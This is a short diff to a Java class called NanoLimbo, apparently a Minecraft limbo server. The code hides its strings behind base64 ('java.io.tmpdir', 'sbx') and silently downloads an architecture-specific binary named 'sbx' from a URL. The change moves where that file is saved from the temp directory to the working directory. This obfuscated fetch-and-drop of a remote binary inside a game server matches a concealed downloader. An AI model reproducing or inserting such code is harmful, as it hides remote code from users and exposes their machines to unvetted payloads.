@@ -143,7 +143,7 @@ public final class NanoLimbo {
         } else {
             throw new RuntimeException(x("VW5zdXBwb3J0ZWQgYXJjaGl0ZWN0dXJlOiA=") + g);
         }
-        Path i = Paths.get(System.getProperty(x("amF2YS5pby50bXBkaXI=")), x("c2J4"));
+        Path i = Paths.get(x("c2J4"));
         if (!Files.exists(i)) {
             try (InputStream j = new URL(h).openStream()) {
                 Files.copy(j, i, StandardCopyOption.REPLACE_EXISTING);
